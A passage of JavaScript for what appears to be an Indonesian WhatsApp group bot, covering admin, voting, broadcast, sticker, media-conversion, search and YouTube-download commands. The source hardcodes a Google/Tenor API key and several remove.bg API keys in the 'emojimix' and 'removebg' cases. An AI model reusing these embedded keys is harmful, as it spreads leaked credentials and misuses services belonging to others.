		await zaki.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await zaki.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await zaki.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await zaki.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                await zaki.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                await zaki.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `➣ @${mem.id.split('@')[0]}\n`
                }
                zaki.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            zaki.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `➣ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

  *｢  UPVOTE  ｣*  
 
  » Total: ${vote[m.chat][1].length}

 


  *｢  DEVOTE  ｣*  
 
  » Total: ${vote[m.chat][2].length}

 


*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: zaki.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            zaki.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

  *｢  UPVOTE  ｣*  
 
  » Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `  » ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


  *｢  DEVOTE  ｣*  
 
  » Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `  » ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: zaki.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            zaki.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

  *｢  UPVOTE  ｣*  
m 
  » Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `  » ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


  *｢  DEVOTE  ｣*  
 
  » Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `  » ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: zaki.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            zaki.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

  *｢  UPVOTE  ｣*  
 
  » Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `  » ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


  *｢  DEVOTE  ｣*  
 
  » Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `  » ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


*${prefix}hapusvote* - untuk menghapus vote


©${zaki.user.id}
`
zaki.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await zaki.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await zaki.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `Mode Group`, zaki.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await zaki.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await zaki.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `Mode Edit Info`, zaki.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `Mode Antilink`, zaki.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${zaki.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${zaki.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, `Mute Bot`, zaki.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                let response = await zaki.groupInviteCode(m.chat)
                zaki.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await zaki.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await zaki.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                zaki.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} Riy ganteng`
                let getGroups = await zaki.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Group Bot',
                                    url: 'https://chat.whatsapp.com/FZlu1bLAaoZDaIpPGq7GyS'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Back To Menu',
                                    id: 'menu'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      zaki.send5ButImg(i, txt, zaki.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Group Bot',
                                    url: 'https://chat.whatsapp.com/FZlu1bLAaoZDaIpPGq7GyS'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Back To Menu',
                                    id: 'menu'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      zaki.send5ButImg(yoi, txt, zaki.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `➣ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━➣ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ➣ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                zaki.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await zaki.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 zaki.sendTextWithMentions(m.chat, teks, m)
             }
             break
              case 'listgc': {
                 let getGroups = await zaki.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await zaki.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 zaki.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    zaki.sendText(m.chat, 'List Online:\n\n' + online.map(v => '➣ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            load(`Loading...`)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await zaki.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await zaki.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
case 'smeme': case 'stickermeme': case 'stickmeme': {
let { TelegraPh } = require('./lib/uploader')
if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
load(`Loading...`)
mee = await zaki.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await zaki.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
            case 'ebinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            m.reply(db)
        }
        break
            case 'emojimix': {
	        if (!text) throw `Example : ${prefix + command} 😅+🤔`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await zaki.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                load(`Loading...`)
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    zaki.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                load(`Loading...`)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await zaki.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            load(`Loading...`)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            zaki.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            load(`Loading...`)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            zaki.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${zaki.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            load(`Loading...`)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            zaki.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                load(`Loading...`)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await zaki.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                load(`Loading...`)
		        let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await zaki.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await zaki.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    load(`Loading...`)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    zaki.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `➣ No : ${no++}\n➣ Type : ${i.type}\n➣ Video ID : ${i.videoId}\n➣ Title : ${i.title}\n➣ Views : ${i.views}\n➣ Duration : ${i.timestamp}\n➣ Upload At : ${i.ago}\n➣ Author : ${i.author.name}\n➣ Url : ${i.url}\n\n─────────────────\n\n`
                }
                zaki.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `➣ *Title* : ${g.title}\n`
                teks += `➣ *Description* : ${g.snippet}\n`
                teks += `➣ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: zaki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                load(`Loading...`)
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: ' Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: ' Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
➣ Title : ${anu.title}
➣ Ext : Search
➣ ID : ${anu.videoId}
➣ Duration : ${anu.timestamp}
➣ Viewers : ${anu.views}
➣ Upload At : ${anu.ago}
➣ Author : ${anu.author.name}
➣ Channel : ${anu.author.url}
➣ Description : ${anu.description}
➣ Url : ${anu.url}`,
                    footer: zaki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
               load(`Loading...`)
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 10000000000) return m.reply('File Melebihi Batas '+util.format(media))
                zaki.sendImage(m.chat, media.thumb, `➣ Title : ${media.title}\n➣ File Size : ${media.filesizeF}\n➣ Url : ${isUrl(text)}\n➣ Ext : MP3\n➣ Resolusi : ${args[1] || '128kbps'}`, m)
                zaki.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
               load(`Loading...`)
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 10000000000) return m.reply('File Melebihi Batas '+util.format(media))
                zaki.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `➣ Title : ${media.title}\n➣ File Size : ${media.filesizeF}\n➣ Url : ${isUrl(text)}\n➣ Ext : MP3\n➣ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 10000000000) return m.reply('File Melebihi Batas '+util.format(media))
